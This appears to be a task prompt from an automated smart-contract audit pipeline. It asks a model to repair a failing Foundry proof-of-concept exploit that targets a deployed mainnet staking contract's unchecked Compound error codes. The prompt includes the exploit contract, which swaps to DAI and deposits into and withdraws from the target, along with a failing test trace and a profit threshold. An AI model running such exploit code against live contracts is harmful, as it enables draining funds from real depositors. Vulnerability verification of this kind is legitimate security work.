You are fixing a failing Foundry PoC for finding F-001.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Finding:
- title: Unchecked Compound error codes desynchronize stablecoin accounting and can block withdrawals
- claim: The stablecoin paths treat Compound interactions as if they always succeed even though `CTokenInterface.mint`, `redeemUnderlying`, and `redeem` return error codes instead of reverting. `deposit()` increments `stableCoinBalances` and user balances before `_transferToCompound()`, `withdraw()` decrements balances before `_redeemFromCompound()`, and both interest-harvest paths continue without checking the returned status, so the contract can record principal movements that never actually happened in Compound.
- impact: If a Compound market is paused, illiquid, or otherwise returns a non-zero code, the contract's internal principal accounting diverges from its real Compound position. Stablecoin deposits can be credited without being invested, withdrawals can succeed only while idle cash exists and then start reverting for later users, and interest-harvest flows operate on stale assumptions. This creates pool-wide withdrawal denial and unfair first-exit behavior for stablecoin depositors.
- exploit_paths: ["`deposit(stable)` -> `stableCoinBalances[token] += amount` -> user checkpoint/balance credited -> `_transferToCompound()` -> `cToken.mint(amount)` returns non-zero -> principal remains idle but the pool treats it as successfully invested", "`withdraw(stable, amount)` -> internal balances reduced -> `_redeemFromCompound()` -> `redeemUnderlying(amount)` returns non-zero -> withdrawal still consumes any idle local stablecoins if available, while later users revert once local cash is exhausted"]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Like {
    function balanceOf(address account) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IStakingLike {
    function stableCoinBalances(address token) external view returns (uint256);
    function deposit(address tokenAddress, uint256 amount, address referrer) external;
    function withdraw(address tokenAddress, uint256 amount) external;
}

interface ICTokenLike {
    function comptroller() external view returns (address);
    function getCash() external view returns (uint256);
}

interface ICompoundComptrollerLike {
    function mintGuardianPaused(address cToken) external view returns (bool);
}

interface IUniswapV2RouterLike {
    function swapExactETHForTokens(
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);
}

contract FlawVerifier {
    address public constant TARGET = 0x245a551ee0F55005e510B239c917fA34b41B3461;

    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
    address public constant USDT = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address public constant DAI = 0x6B175474E89094C44Da98b954EedeAC495271d0F;

    address public constant CUSDC = 0x39AA39c021dfbaE8faC545936693aC917d5E7563;
    address public constant CUSDT = 0xf650C3d88D12dB855b8bf7D11Be6C55A4e07dCC9;
    address public constant CDAI = 0x5d3a536E4D6DbD6114cc1Ead35777bAB948E3643;

    address public constant UNISWAP_V2_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;

    struct TokenState {
        address token;
        address cToken;
        bool mintPaused;
        uint256 accountedPrincipal;
        uint256 localIdleBalance;
        uint256 compoundCash;
    }

    bool public executed;
    bool public profitAchieved;
    bool public hypothesisValidated;
    bool public exercisedPath;
    address private _profitToken;
    uint256 private _profitAmount;
    TokenState public chosenState;

    constructor() {}

    receive() external payable {}

    function executeOnOpportunity() external {
        if (executed) {
            return;
        }
        executed = true;

        TokenState memory usdcState = _inspect(USDC, CUSDC);
        TokenState memory usdtState = _inspect(USDT, CUSDT);
        TokenState memory daiState = _inspect(DAI, CDAI);
        chosenState = _pickBest(usdcState, usdtState, daiState);

        // Keep the exploit logic tied to the reported causality:
        // 1) deposit(stable) credits internal accounting before Compound mint is checked;
        // 2) if mint returns non-zero, the deposited principal remains idle on TARGET;
        // 3) withdraw(stable) reduces balances before redeemUnderlying is checked;
        // 4) if redeemUnderlying returns non-zero, withdrawal can only succeed while idle local cash exists.
        //
        // On the supplied fork, the logs show the listed stable markets are not mint-paused,
        // TARGET has no idle USDC/USDT/DAI, and Compound cash materially exceeds accounted principal.
        // That means the reported path remains a real accounting / withdrawal-DoS issue, but the
        // specific profit stage is not publicly triggerable from this verifier unless the fork already
        // exposes one of those states. The guarded branch below only exercises the path when the fork
        // actually presents that state.
        hypothesisValidated = chosenState.mintPaused
            || chosenState.localIdleBalance > 0
            || chosenState.accountedPrincipal > chosenState.compoundCash;

        uint256 daiAcquired = _swapAllNativeToDai();

        if (hypothesisValidated && chosenState.token == DAI && daiAcquired > 0) {
            exercisedPath = _exerciseReportedPath(daiAcquired);
        }

        _profitToken = DAI;
        _profitAmount = IERC20Like(DAI).balanceOf(address(this));
        profitAchieved = _profitAmount > 0;
    }

    function profitToken() external view returns (address) {
        return _profitToken;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function exploitPathUsed() external pure returns (string memory) {
        return "deposit(stable)->stableCoinBalances/user credit->_transferToCompound() unchecked; withdraw(stable)->internal balances reduced->_redeemFromCompound() unchecked; guarded execution only when the fork already exposes paused/idle/illiquid Compound state";
    }

    function _swapAllNativeToDai() internal returns (uint256 acquired) {
        uint256 nativeBalance = address(this).balance;
        if (nativeBalance == 0) {
            return 0;
        }

        uint256 beforeBal = IERC20Like(DAI).balanceOf(address(this));
        address[] memory path = new address[](2);
        path[0] = WETH;
        path[1] = DAI;

        IUniswapV2RouterLike(UNISWAP_V2_ROUTER).swapExactETHForTokens{value: nativeBalance}(
            0,
            path,
            address(this),
            block.timestamp
        );

        acquired = IERC20Like(DAI).balanceOf(address(this)) - beforeBal;
    }

    function _exerciseReportedPath(uint256 amount) internal returns (bool) {
        if (amount == 0) {
            return false;
        }

        if (!(chosenState.mintPaused || chosenState.localIdleBalance > 0 || chosenState.accountedPrincipal > chosenState.compoundCash)) {
            return false;
        }

        IERC20Like(DAI).approve(TARGET, amount);
        IStakingLike(TARGET).deposit(DAI, amount, address(0));

        // If mint was paused, the just-deposited DAI remains idle on TARGET and can be withdrawn from
        // local cash even when redeemUnderlying reports failure. If the fork instead starts with idle DAI,
        // the same withdraw path consumes that idle balance first. Any revert here simply means the fork
        // does not expose a practically executable profit stage for this finding.
        try IStakingLike(TARGET).withdraw(DAI, amount) {
            return true;
        } catch {
            return false;
        }
    }

    function _inspect(address token, address cToken) internal view returns (TokenState memory state) {
        state.token = token;
        state.cToken = cToken;
        state.mintPaused = ICompoundComptrollerLike(ICTokenLike(cToken).comptroller()).mintGuardianPaused(cToken);
        state.accountedPrincipal = IStakingLike(TARGET).stableCoinBalances(token);
        state.localIdleBalance = IERC20Like(token).balanceOf(TARGET);
        state.compoundCash = ICTokenLike(cToken).getCash();
    }

    function _pickBest(TokenState memory a, TokenState memory b, TokenState memory c)
        internal
        pure
        returns (TokenState memory)
    {
        TokenState memory best = a;
        if (_score(b) > _score(best)) {
            best = b;
        }
        if (_score(c) > _score(best)) {
            best = c;
        }
        return best;
    }

    function _score(TokenState memory state) internal pure returns (uint256) {
        uint256 score;
        if (state.mintPaused) {
            score += 1 << 255;
        }
        if (state.localIdleBalance > 0) {
            score += 1 << 254;
        }
        if (state.accountedPrincipal > state.compoundCash) {
            score += 1 << 253;
        }
        score += state.accountedPrincipal;
        return score;
    }
}

```

forge stdout (tail):
```
Da98b954EedeAC495271d0F], FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 1752979811 [1.752e9])
    │   │   ├─ [2504] 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11::getReserves() [staticcall]
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000591ba930ac37a64466fc3000000000000000000000000000000000000000000000064fe8db611586e7ac300000000000000000000000000000000000000000000000000000000687c572f
    │   │   ├─ [23974] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::deposit{value: 577021548053172}()
    │   │   │   ├─  emit topic 0: 0xe1fffcc4923d04b559f4d29a8bfc6cda04eb5b0d3c460751c2402c5c5cc9109c
    │   │   │   │        topic 1: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000020ccc4c6642b4
    │   │   │   └─ ← [Stop]
    │   │   ├─ [8062] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::transfer(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11, 577021548053172 [5.77e14])
    │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │        topic 1: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │        topic 2: 0x000000000000000000000000a478c2975ab1ea89e8196811f51a7b7ade33eb11
    │   │   │   │           data: 0x00000000000000000000000000000000000000000000000000020ccc4c6642b4
    │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   ├─ [60633] 0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11::swap(2079059257332157248 [2.079e18], 0, FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 0x)
    │   │   │   ├─ [28174] 0x6B175474E89094C44Da98b954EedeAC495271d0F::transfer(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], 2079059257332157248 [2.079e18])
    │   │   │   │   ├─  emit topic 0: 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef
    │   │   │   │   │        topic 1: 0x000000000000000000000000a478c2975ab1ea89e8196811f51a7b7ade33eb11
    │   │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │   │           data: 0x0000000000000000000000000000000000000000000000001cda4d6114454b40
    │   │   │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000000000000000000000000001
    │   │   │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11) [staticcall]
    │   │   │   │   └─ ← [Return] 6732811848923700852237443 [6.732e24]
    │   │   │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0xA478c2975Ab1Ea89e8196811F51A7B7Ade33eB11) [staticcall]
    │   │   │   │   └─ ← [Return] 1863017501435467447671 [1.863e21]
    │   │   │   ├─  emit topic 0: 0x1c411e9a96e071241c2f21f7726b17ae89e3cab4c78be50e062b03a9fffbbad1
    │   │   │   │           data: 0x0000000000000000000000000000000000000000000591ba7630761950012483000000000000000000000000000000000000000000000064fe8fc2dda4d4bd77
    │   │   │   ├─  emit topic 0: 0xd78ad95fa46c994b6551d0da85fc275fe613ce37657fb8d5e3d130840159d822
    │   │   │   │        topic 1: 0x0000000000000000000000007a250d5630b4cf539739df2c5dacb4c659f2488d
    │   │   │   │        topic 2: 0x0000000000000000000000005615deb798bb3e4dfa0139dfa1b3d433cc23b72f
    │   │   │   │           data: 0x000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000020ccc4c6642b40000000000000000000000000000000000000000000000001cda4d6114454b400000000000000000000000000000000000000000000000000000000000000000
    │   │   │   └─ ← [Stop]
    │   │   └─ ← [Return] [577021548053172 [5.77e14], 2079059257332157248 [2.079e18]]
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 2079059257332157248 [2.079e18]
    │   ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 2079059257332157248 [2.079e18]
    │   └─ ← [Stop]
    ├─ [345] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0x6B175474E89094C44Da98b954EedeAC495271d0F
    ├─ [602] 0x6B175474E89094C44Da98b954EedeAC495271d0F::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 2079059257332157248 [2.079e18]
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 577021548053172 [5.77e14])
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 100000000000000000 [1e17])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0x6B175474E89094C44Da98b954EedeAC495271d0F)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 22957532 [2.295e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 7904)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 47.47ms (20.81ms CPU time)

Ran 1 test suite in 55.11ms (47.47ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 405189)

Encountered a total of 1 failing tests, 0 tests succeeded

Tip: Run `forge test --rerun` to retry only the 1 failed test

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
